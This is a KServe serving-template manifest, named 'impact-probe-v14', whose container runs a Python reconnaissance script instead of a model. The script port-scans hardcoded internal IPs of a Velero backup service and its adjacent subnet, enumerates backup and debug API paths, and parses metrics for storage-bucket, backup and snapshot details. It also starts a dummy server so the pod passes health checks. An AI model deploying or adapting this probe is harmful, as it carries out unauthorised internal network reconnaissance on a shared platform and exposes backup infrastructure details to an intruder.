apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: impact-probe-v14
  labels:
    scenarios.ai.sap.com/id: "impact-probe-v14"
    ai.sap.com/version: "1.0.0"
  annotations:
    scenarios.ai.sap.com/name: "impact-probe-v14"
    executables.ai.sap.com/name: "impact-probe-v14"
    executables.ai.sap.com/description: "Velero direct pod probe v14"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            cat > /tmp/probe.py << 'PYEOF'
            import socket, ssl, re, errno as errno_mod
            import urllib.request, urllib.error

            def report(k, v):
                print(f"[P14] {k}: {str(v)[:8000]}", flush=True)

            def http_get(url, headers=None, timeout=10):
                try:
                    req = urllib.request.Request(url, headers=headers or {})
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                        return r.read().decode(errors="replace"), r.status, dict(r.headers)
                except urllib.error.HTTPError as e:
                    body = ""
                    try: body = e.read().decode(errors="replace")[:3000]
                    except: pass
                    return f"HTTP_{e.code}:{body}", e.code, {}
                except Exception as e:
                    return f"ERR:{type(e).__name__}:{e}", 0, {}

            def tcp_probe(host, port, timeout=6):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                try:
                    s.connect((host, port))
                    s.close()
                    return "OPEN"
                except socket.timeout:
                    return "ETIMEDOUT"
                except ConnectionRefusedError:
                    return "ECONNREFUSED"
                except OSError as e:
                    return f"OSError_{e.errno}_{errno_mod.errorcode.get(e.errno, '?')}"
                finally:
                    try: s.close()
                    except: pass

            VELERO_POD_IP  = "100.64.85.21"
            VELERO_SVC_IP  = "100.106.232.21"

            # ── 1. TCP REACHABILITY ───────────────────────────────────────────────
            report("---", "=== 1. TCP REACHABILITY ===")
            for target, label in [(VELERO_POD_IP, "POD"), (VELERO_SVC_IP, "SVC")]:
                for port in [8085, 8080, 8443, 80, 443, 11001, 2112]:
                    result = tcp_probe(target, port)
                    report(f"TCP_{label}_{target}:{port}", result)

            # ── 2. HTTP PROBE ON ALL RESPONSIVE PORTS ────────────────────────────
            report("---", "=== 2. HTTP PROBE ===")
            for target, label in [(VELERO_POD_IP, "POD"), (VELERO_SVC_IP, "SVC")]:
                for port in [8085, 8080, 80]:
                    for scheme in ["http", "https"]:
                        body, code, hdrs = http_get(f"{scheme}://{target}:{port}/", timeout=7)
                        if code != 0 and "ERR:timed" not in body and "ERR:Connection" not in body:
                            report(f"HTTP_{label}_{scheme}_{target}:{port}_root",
                                   f"[{code}] hdrs={list(hdrs.keys())[:6]} {body[:300]}")
                            # If we get any non-error response, enumerate paths
                            for path in ["/metrics", "/api/v1", "/api/v1/backups",
                                         "/api/v1/backup-storage-locations",
                                         "/api/v1/schedules", "/api/v1/restores",
                                         "/api/v1/volume-snapshot-locations",
                                         "/health", "/version", "/debug/pprof"]:
                                b2, c2, h2 = http_get(f"{scheme}://{target}:{port}{path}", timeout=7)
                                if c2 != 0 and "ERR:timed" not in b2 and "ERR:Connection" not in b2:
                                    report(f"HTTP_{label}_{scheme}_{target}:{port}{path.replace('/','_')}",
                                           f"[{c2}] {b2[:3000]}")

            # ── 3. METRICS DEEP PARSE (if /metrics reachable) ────────────────────
            report("---", "=== 3. VELERO METRICS FULL PARSE ===")
            for target, label in [(VELERO_POD_IP, "POD"), (VELERO_SVC_IP, "SVC")]:
                body, code, _ = http_get(f"http://{target}:8085/metrics", timeout=10)
                if code == 200:
                    report(f"METRICS_{label}_FULL", body[:8000])
                    lines = body.split("\n")
                    # Storage location info (S3 bucket, region, prefix)
                    bsl = [l for l in lines if "backup_storage_location" in l and not l.startswith("#")]
                    report(f"METRICS_{label}_BSL", "\n".join(bsl))
                    # Backup history (names, sizes, timestamps)
                    backup = [l for l in lines if "velero_backup" in l and not l.startswith("#") and l.strip()]
                    report(f"METRICS_{label}_BACKUPS", "\n".join(backup[:60]))
                    # Schedule info
                    schedule = [l for l in lines if "schedule" in l.lower() and not l.startswith("#") and l.strip()]
                    report(f"METRICS_{label}_SCHEDULES", "\n".join(schedule[:20]))
                    # Volume snapshot
                    vsl = [l for l in lines if "volume_snapshot" in l and not l.startswith("#") and l.strip()]
                    report(f"METRICS_{label}_VSL", "\n".join(vsl[:20]))
                else:
                    report(f"METRICS_{label}_8085", f"[{code}] {body[:200]}")

            # ── 4. VELERO REST API (port 8085 serves both metrics + REST) ─────────
            report("---", "=== 4. VELERO REST API ===")
            for target, label in [(VELERO_POD_IP, "POD"), (VELERO_SVC_IP, "SVC")]:
                # Velero REST API with namespace header
                for path in ["/api/v1/backups", "/api/v1/backup-storage-locations",
                              "/api/v1/schedules", "/api/v1/restores",
                              "/api/v1/downloadrequests"]:
                    body, code, hdrs = http_get(
                        f"http://{target}:8085{path}",
                        headers={"Accept": "application/json",
                                 "X-Kubernetes-Namespace": "velero"},
                        timeout=8
                    )
                    if code != 0 and "ERR:timed" not in body and "ERR:Connection" not in body:
                        report(f"REST_{label}{path.replace('/','_')}", f"[{code}] {body[:2000]}")

            # ── 5. VELERO POD: try adjacent IPs (same /24) ───────────────────────
            report("---", "=== 5. ADJACENT IP SCAN (100.64.85.x) ===")
            # In case velero moved pods or there are multiple replicas
            subnet = "100.64.85"
            for i in range(1, 40):
                ip = f"{subnet}.{i}"
                if ip == VELERO_POD_IP:
                    continue
                result = tcp_probe(ip, 8085, timeout=2)
                if result == "OPEN":
                    report(f"ADJACENT_{ip}:8085", "OPEN")
                    body, code, _ = http_get(f"http://{ip}:8085/metrics", timeout=5)
                    report(f"ADJACENT_{ip}_METRICS", f"[{code}] {body[:1000]}")
                elif result not in ("ETIMEDOUT", "ECONNREFUSED"):
                    report(f"ADJACENT_{ip}:8085", result)

            # ── 6. HTTPS PROBE (Velero may use TLS on 8085 or 11001) ──────────────
            report("---", "=== 6. VELERO HTTPS / TLS ===")
            for target in [VELERO_POD_IP, VELERO_SVC_IP]:
                for port in [8085, 8443, 11001]:
                    body, code, hdrs = http_get(f"https://{target}:{port}/metrics", timeout=7)
                    if code != 0 and "ERR:timed" not in body and "ERR:Connection" not in body:
                        report(f"HTTPS_{target}:{port}_metrics", f"[{code}] {body[:1000]}")

            # ── 7. RAW TCP BANNER GRAB ────────────────────────────────────────────
            report("---", "=== 7. RAW BANNER GRAB ===")
            for target in [VELERO_POD_IP, VELERO_SVC_IP]:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(6)
                try:
                    s.connect((target, 8085))
                    report(f"BANNER_{target}:8085_CONNECT", "SUCCESS")
                    # Send minimal HTTP/1.0 GET
                    s.sendall(b"GET /metrics HTTP/1.0\r\nHost: velero\r\n\r\n")
                    import time; time.sleep(1)
                    data = b""
                    s.settimeout(3)
                    try:
                        while True:
                            chunk = s.recv(4096)
                            if not chunk: break
                            data += chunk
                    except: pass
                    report(f"BANNER_{target}:8085_RESPONSE", data.decode(errors="replace")[:3000])
                except socket.timeout:
                    report(f"BANNER_{target}:8085", "ETIMEDOUT")
                except ConnectionRefusedError:
                    report(f"BANNER_{target}:8085", "ECONNREFUSED")
                except OSError as e:
                    report(f"BANNER_{target}:8085", f"OSError_{e.errno}_{errno_mod.errorcode.get(e.errno,'?')}: {e}")
                finally:
                    try: s.close()
                    except: pass

            report("DONE", "probe v14 complete")
            PYEOF
            python3 /tmp/probe.py 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self):
                    self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
          ports:
          - containerPort: 8080
            protocol: TCP
          readinessProbe:
            httpGet:
              path: /
              port: 8080
            initialDelaySeconds: 30
            periodSeconds: 10
          livenessProbe:
            httpGet:
              path: /
              port: 8080
            initialDelaySeconds: 30
            periodSeconds: 15
